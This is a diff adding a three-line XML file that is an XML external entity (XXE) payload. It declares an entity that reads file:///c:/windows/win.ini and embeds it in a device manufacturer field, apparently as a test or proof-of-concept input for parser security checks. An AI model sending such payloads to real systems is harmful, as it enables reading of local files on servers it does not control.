@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY secret SYSTEM "file:///c:/windows/win.ini">]>
+<root><device><manufacturer>&secret;</manufacturer></device></root>
